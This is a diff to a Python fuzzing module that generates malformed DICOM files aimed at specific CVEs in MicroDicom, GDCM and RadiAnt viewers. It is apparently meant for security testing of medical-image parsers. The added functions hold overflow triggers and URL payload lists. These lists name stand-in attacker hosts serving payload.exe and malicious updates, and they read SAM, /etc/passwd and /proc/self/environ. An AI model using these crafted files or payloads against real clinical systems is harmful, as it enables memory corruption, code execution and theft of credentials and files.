@@ -3,18 +3,31 @@
 Mutation strategies based on known DICOM vulnerabilities and CVEs.
 These target specific vulnerability patterns found in real-world DICOM parsers.
 
-CVEs Covered:
+CVEs Covered (20 total mutations across 14 CVEs):
+
+2025 CVEs:
 - CVE-2025-5943: MicroDicom heap buffer overflow in pixel data parsing
+- CVE-2025-35975: MicroDicom out-of-bounds write (June 2025)
 - CVE-2025-11266: GDCM out-of-bounds write in encapsulated PixelData fragments
 - CVE-2025-53618: GDCM JPEG codec out-of-bounds read (info leak)
 - CVE-2025-53619: GDCM JPEG codec out-of-bounds read
+- CVE-2025-1001: RadiAnt DICOM Viewer certificate validation bypass (MITM)
+
+2024 CVEs:
+- CVE-2024-22100: MicroDicom heap-based buffer overflow
+- CVE-2024-25578: MicroDicom out-of-bounds write (lack of validation)
+- CVE-2024-28877: MicroDicom stack-based buffer overflow
+- CVE-2024-33606: MicroDicom URL scheme bypass
+
+Legacy CVEs:
 - CVE-2019-11687: DICOM preamble polyglot (PE/DICOM, ELF/DICOM)
 - CVE-2020-29625: DCMTK denial of service via malformed length fields
 - CVE-2021-41946: ClearCanvas path traversal via filename injection
 - CVE-2022-24193: OsiriX denial of service via deep nesting
 
 References:
-- CISA ICS-CERT Medical Advisories (ICSMA-25-160-01, ICSMA-25-345-01)
+- CISA ICS-CERT Medical Advisories (ICSMA-24-060-01, ICSMA-25-037-01,
+  ICSMA-25-051-01, ICSMA-25-160-01, ICSMA-25-345-01)
 - NIST NVD DICOM entries
 - OWASP Medical Device Security
 
@@ -33,9 +46,12 @@ class CVECategory(Enum):
     """Categories of CVE-inspired mutations."""
 
     HEAP_OVERFLOW = "heap_overflow"
+    STACK_OVERFLOW = "stack_overflow"
     BUFFER_OVERFLOW = "buffer_overflow"
     INTEGER_OVERFLOW = "integer_overflow"
     INTEGER_UNDERFLOW = "integer_underflow"
+    OUT_OF_BOUNDS_WRITE = "out_of_bounds_write"
+    OUT_OF_BOUNDS_READ = "out_of_bounds_read"
     PATH_TRAVERSAL = "path_traversal"
     DENIAL_OF_SERVICE = "denial_of_service"
     POLYGLOT = "polyglot"
@@ -43,7 +59,8 @@ class CVECategory(Enum):
     MALFORMED_LENGTH = "malformed_length"
     ENCAPSULATED_PIXEL = "encapsulated_pixel"
     JPEG_CODEC = "jpeg_codec"
-    OUT_OF_BOUNDS_READ = "out_of_bounds_read"
+    CERTIFICATE_VALIDATION = "certificate_validation"
+    URL_SCHEME_BYPASS = "url_scheme_bypass"
 
 
 @dataclass
@@ -568,6 +585,324 @@ def mutate_jpeg_truncated_stream(data: bytes) -> bytes:
     return bytes(result)
 
 
+# CVE-2025-35975: MicroDicom Out-of-Bounds Write (June 2025)
+# CISA Advisory: ICSMA-25-160-01
+# CVSS: 8.4 (High)
+
+
+def mutate_oob_write_pixel_data(data: bytes) -> bytes:
+    """Create mutation targeting CVE-2025-35975 out-of-bounds write.
+
+    MicroDicom DICOM Viewer vulnerability:
+    - Out-of-bounds write due to insufficient validation of user-supplied data
+    - Exploitable via malicious DCM file
+    - Can allow arbitrary code execution
+
+    Attack vector: Malformed pixel data with specific dimension/size mismatches.
+    """
+    result = bytearray(data)
+
+    # Target specific dimension combinations that trigger OOB write
+    # The vulnerability occurs when calculated buffer size differs from actual
+    oob_triggers = [
+        # (rows, cols, bits_allocated) - combinations that cause OOB
+        (1, 0xFFFE, 16),  # Near-max columns with minimal rows
+        (0xFFFE, 1, 16),  # Near-max rows with minimal columns
+        (256, 256, 32),  # Large bits allocated
+        (512, 512, 24),  # 24-bit (unusual) allocation
+    ]
+
+    rows, cols, bits = random.choice(oob_triggers)
+
+    # Modify Rows (0028,0010)
+    rows_tag = b"\x28\x00\x10\x00"
+    idx = data.find(rows_tag)
+    if idx != -1 and idx + 8 < len(result):
+        result[idx + 6 : idx + 8] = struct.pack("<H", rows)
+
+    # Modify Columns (0028,0011)
+    cols_tag = b"\x28\x00\x11\x00"
+    idx = data.find(cols_tag)
+    if idx != -1 and idx + 8 < len(result):
+        result[idx + 6 : idx + 8] = struct.pack("<H", cols)
+
+    # Modify BitsAllocated (0028,0100)
+    bits_tag = b"\x28\x00\x00\x01"
+    idx = data.find(bits_tag)
+    if idx != -1 and idx + 8 < len(result):
+        result[idx + 6 : idx + 8] = struct.pack("<H", bits)
+
+    # Add undersized PixelData to trigger the write beyond bounds
+    pixel_data_tag = b"\xe0\x7f\x10\x00"
+    idx = data.find(pixel_data_tag)
+    if idx != -1 and idx + 8 < len(result):
+        # Set a small PixelData length that doesn't match dimensions
+        if idx + 12 < len(result):
+            result[idx + 8 : idx + 12] = struct.pack("<I", 64)  # Only 64 bytes
+
+    return bytes(result)
+
+
+# CVE-2024-25578: MicroDicom Out-of-Bounds Write (2024)
+# CISA Advisory: ICSMA-24-060-01
+# CVSS: 7.8 (High)
+
+
+def mutate_oob_write_lack_validation(data: bytes) -> bytes:
+    """Create mutation targeting CVE-2024-25578 out-of-bounds write.
+
+    MicroDicom vulnerability due to lack of proper validation:
+    - Memory corruption within the application
+    - Triggered by malformed DCM file
+
+    Attack vector: Malformed element lengths and value representations.
+    """
+    result = bytearray(data)
+
+    # Find explicit VR elements and corrupt their lengths
+    explicit_vrs = [b"OB", b"OW", b"OF", b"OD", b"SQ", b"UN", b"UC", b"UR", b"UT"]
+
+    mutations_applied = 0
+    for vr in explicit_vrs:
+        idx = 0
+        while mutations_applied < 3:  # Limit mutations per file
+            idx = result.find(vr, idx)
+            if idx == -1:
+                break
+
+            # Check if this looks like a valid VR position (after 4-byte tag)
+            if idx >= 4 and idx + 8 < len(result):
+                # For OB/OW/OF/OD/SQ/UN/UC/UR/UT, length is at offset +4 (4 bytes)
+                length_offset = idx + 4
+                if length_offset + 4 < len(result):
+                    # Set length to a value that causes OOB write
+                    if random.random() < 0.5:
+                        # Length pointing past end of file
+                        result[length_offset : length_offset + 4] = struct.pack(
+                            "<I", len(result) * 2
+                        )
+                        mutations_applied += 1
+
+            idx += 1
+
+    return bytes(result)
+
+
+# CVE-2024-22100: MicroDicom Heap-Based Buffer Overflow
+# CISA Advisory: ICSMA-24-060-01
+# CVSS: 7.8 (High)
+
+
+def mutate_heap_overflow_dcm_parsing(data: bytes) -> bytes:
+    """Create mutation targeting CVE-2024-22100 heap buffer overflow.
+
+    MicroDicom heap-based buffer overflow:
+    - Exploitable by opening malicious DCM file
+    - Allows remote code execution
+    - Low complexity attack
+
+    Attack vector: Specific combinations of DICOM elements that overflow heap.
+    """
+    result = bytearray(data)
+
+    # Target Private Creator elements which are often parsed into fixed buffers
+    private_creator_tag = b"\x09\x00\x10\x00"  # (0009,0010) Private Creator
+    idx = data.find(private_creator_tag)
+
+    if idx == -1:
+        # Inject a private creator with overflow payload
+        # Insert after file meta header (after first 132 bytes typically)
+        insert_pos = min(200, len(result) - 4)
+
+        # Create oversized private creator element
+        overflow_payload = (
+            private_creator_tag
+            + b"LO"  # VR
+            + struct.pack("<H", 0xFFFF)  # Max length
+            + b"A" * 256  # Overflow data
+        )
+        result = result[:insert_pos] + overflow_payload + result[insert_pos:]
+    else:
+        # Modify existing private creator length
+        if idx + 8 < len(result):
+            result[idx + 6 : idx + 8] = struct.pack("<H", 0xFFFF)
+
+    # Also target SOP Instance UID for additional overflow vector
+    sop_uid_tag = b"\x08\x00\x18\x00"  # (0008,0018)
+    idx = data.find(sop_uid_tag)
+    if idx != -1 and idx + 8 < len(result):
+        # Set oversized length
+        result[idx + 6 : idx + 8] = struct.pack("<H", 512)
+
+    return bytes(result)
+
+
+# CVE-2024-28877: MicroDicom Stack-Based Buffer Overflow
+# CISA Advisory: ICSMA-24-060-01
+# CVSS: 8.7 (High)
+
+
+def mutate_stack_overflow_dcm(data: bytes) -> bytes:
+    """Create mutation targeting CVE-2024-28877 stack buffer overflow.
+
+    MicroDicom stack-based buffer overflow:
+    - User interaction required (open malicious file)
+    - Allows arbitrary code execution
+    - Affects version 2023.3 and prior
+
+    Attack vector: Deeply nested structures or oversized string elements.
+    """
+    result = bytearray(data)
+
+    # Stack overflows often triggered by:
+    # 1. Recursive parsing of deeply nested sequences
+    # 2. Large string values copied to stack buffers
+
+    # Create deeply nested sequence that may overflow stack
+    nesting_depth = random.randint(200, 1000)
+
+    item_start = b"\xfe\xff\x00\xe0"  # Item
+    item_end = b"\xfe\xff\x0d\xe0"  # Item Delimitation
+    sq_start = b"\x08\x00\x15\x11"  # Referenced Series Sequence
+
+    # Build recursive sequence structure
+    nested = b""
+    for _ in range(nesting_depth):
+        nested = (
+            sq_start
+            + b"SQ\x00\x00"
+            + b"\xff\xff\xff\xff"  # Undefined length
+            + item_start
+            + b"\xff\xff\xff\xff"
+            + nested
+            + item_end
+            + b"\x00\x00\x00\x00"
+            + b"\xfe\xff\xdd\xe0"  # Sequence delimitation
+            + b"\x00\x00\x00\x00"
+        )
+
+    # Also inject oversized Patient Name (stack buffer target)
+    patient_name_tag = b"\x10\x00\x10\x00"  # (0010,0010)
+    idx = data.find(patient_name_tag)
+    if idx != -1 and idx + 8 < len(result):
+        # Set length to trigger stack copy overflow
+        result[idx + 6 : idx + 8] = struct.pack("<H", 4096)
+        # Pad with overflow data
+        overflow_data = b"A" * 4096
+        result = result[: idx + 8] + overflow_data + result[idx + 8 :]
+
+    # Append nested structure
+    result = result[:-4] + nested + result[-4:]
+
+    return bytes(result)
+
+
+# CVE-2024-33606: MicroDicom URL Scheme Bypass
+# CISA Advisory: ICSMA-24-060-01
+# CVSS: 8.8 (High)
+
+
+def mutate_url_scheme_bypass(data: bytes) -> bytes:
+    """Create mutation targeting CVE-2024-33606 URL scheme bypass.
+
+    MicroDicom URL scheme vulnerability:
+    - Bypass of security restrictions via crafted URLs in DICOM elements
+    - Can lead to arbitrary file access or code execution
+
+    Attack vector: Malicious URLs in Retrieve URL or similar elements.
+    """
+    result = bytearray(data)
+
+    # Malicious URL payloads for various bypass techniques
+    url_payloads = [
+        b"file:///C:/Windows/System32/config/SAM",
+        b"file://localhost/etc/passwd",
+        b"\\\\attacker.com\\share\\payload.exe",
+        b"http://127.0.0.1:8080/../../etc/passwd",
+        b"javascript:alert(1)",  # If rendered in web view
+        b"data:text/html,<script>alert(1)</script>",
+        b"file:///proc/self/environ",
+        b"dict://attacker:11111/",
+        b"gopher://attacker:70/_",
+        b"ldap://attacker/exploit",
+    ]
+
+    payload = random.choice(url_payloads)
+
+    # Target Retrieve URL (0008,1190) or Retrieve URI (0040,E010)
+    retrieve_url_tag = b"\x08\x00\x90\x11"  # (0008,1190) Retrieve URL
+    retrieve_uri_tag = b"\x40\x00\x10\xe0"  # (0040,E010) Retrieve URI
+
+    # Try to find and modify existing URL element
+    for tag in [retrieve_url_tag, retrieve_uri_tag]:
+        idx = data.find(tag)
+        if idx != -1 and idx + 8 < len(result):
+            result[idx + 6 : idx + 8] = struct.pack("<H", len(payload))
+            result = result[: idx + 8] + payload + result[idx + 8 + len(payload) :]
+            break
+    else:
+        # Inject new Retrieve URL element
+        insert_pos = min(300, len(result) - 4)
+        url_element = (
+            retrieve_url_tag + b"UR" + struct.pack("<H", len(payload)) + payload
+        )
+        result = result[:insert_pos] + url_element + result[insert_pos:]
+
+    return bytes(result)
+
+
+# CVE-2025-1001: RadiAnt DICOM Viewer Certificate Validation Bypass
+# CISA Advisory: ICSMA-25-051-01
+# CVSS: 5.7 (Medium)
+
+
+def mutate_certificate_validation_bypass(data: bytes) -> bytes:
+    """Create mutation targeting CVE-2025-1001 certificate validation bypass.
+
+    RadiAnt DICOM Viewer vulnerability:
+    - Improper certificate validation in update mechanism
+    - Allows MITM attacks with malicious updates
+
+    Note: This mutation simulates the attack pattern by embedding
+    malicious update metadata in DICOM elements that could be
+    processed by viewers with similar vulnerabilities.
+
+    Attack vector: Inject update-related URLs/paths in DICOM metadata.
+    """
+    result = bytearray(data)
+
+    # Payloads that simulate malicious update redirection
+    update_payloads = [
+        b"https://attacker.com/DicomViewer_Update.exe",
+        b"http://localhost:8080/malicious_update.msi",
+        b"\\\\evil.com\\updates\\viewer.exe",
+        b"https://update.legitimate-domain.com.attacker.com/update",
+        b"https://DicomViewer.com@attacker.com/update.exe",
+    ]
+
+    payload = random.choice(update_payloads)
+
+    # Inject in Institution Address or similar text field
+    # that might be displayed or processed
+    institution_addr_tag = b"\x08\x00\x81\x00"  # (0008,0081) Institution Address
+    station_name_tag = b"\x08\x00\x10\x10"  # (0008,1010) Station Name
+
+    for tag in [institution_addr_tag, station_name_tag]:
+        idx = data.find(tag)
+        if idx != -1 and idx + 8 < len(result):
+            result[idx + 6 : idx + 8] = struct.pack("<H", len(payload))
+            result = result[: idx + 8] + payload + result[idx + 8 + len(payload) :]
+            break
+    else:
+        # Inject as Software Versions (0018,1020)
+        software_tag = b"\x18\x00\x20\x10"
+        insert_pos = min(250, len(result) - 4)
+        element = software_tag + b"LO" + struct.pack("<H", len(payload)) + payload
+        result = result[:insert_pos] + element + result[insert_pos:]
+
+    return bytes(result)
+
+
 # Registry of all CVE mutations
 
 CVE_MUTATIONS: list[CVEMutation] = [
@@ -676,6 +1011,60 @@ CVE_MUTATIONS: list[CVEMutation] = [
         mutation_func="mutate_jpeg_truncated_stream",
         severity="high",
         target_component="jpeg_codec",
+    ),
+    # CVE-2025-35975: MicroDicom Out-of-Bounds Write (June 2025)
+    CVEMutation(
+        cve_id="CVE-2025-35975",
+        category=CVECategory.OUT_OF_BOUNDS_WRITE,
+        description="MicroDicom OOB write via malformed pixel data dimensions",
+        mutation_func="mutate_oob_write_pixel_data",
+        severity="high",
+        target_component="pixel_data",
+    ),
+    # CVE-2024-25578: MicroDicom Out-of-Bounds Write
+    CVEMutation(
+        cve_id="CVE-2024-25578",
+        category=CVECategory.OUT_OF_BOUNDS_WRITE,
+        description="MicroDicom OOB write due to lack of validation",
+        mutation_func="mutate_oob_write_lack_validation",
+        severity="high",
+        target_component="vr_length",
+    ),
+    # CVE-2024-22100: MicroDicom Heap-Based Buffer Overflow
+    CVEMutation(
+        cve_id="CVE-2024-22100",
+        category=CVECategory.HEAP_OVERFLOW,
+        description="MicroDicom heap overflow in DCM parsing",
+        mutation_func="mutate_heap_overflow_dcm_parsing",
+        severity="high",
+        target_component="private_elements",
+    ),
+    # CVE-2024-28877: MicroDicom Stack-Based Buffer Overflow
+    CVEMutation(
+        cve_id="CVE-2024-28877",
+        category=CVECategory.STACK_OVERFLOW,
+        description="MicroDicom stack overflow via nested sequences",
+        mutation_func="mutate_stack_overflow_dcm",
+        severity="high",
+        target_component="sequence",
+    ),
+    # CVE-2024-33606: MicroDicom URL Scheme Bypass
+    CVEMutation(
+        cve_id="CVE-2024-33606",
+        category=CVECategory.URL_SCHEME_BYPASS,
+        description="MicroDicom URL scheme bypass for arbitrary file access",
+        mutation_func="mutate_url_scheme_bypass",
+        severity="high",
+        target_component="retrieve_url",
+    ),
+    # CVE-2025-1001: RadiAnt DICOM Viewer Certificate Validation Bypass
+    CVEMutation(
+        cve_id="CVE-2025-1001",
+        category=CVECategory.CERTIFICATE_VALIDATION,
+        description="RadiAnt certificate validation bypass enabling MITM",
+        mutation_func="mutate_certificate_validation_bypass",
+        severity="medium",
+        target_component="metadata",
     ),
 ]
 
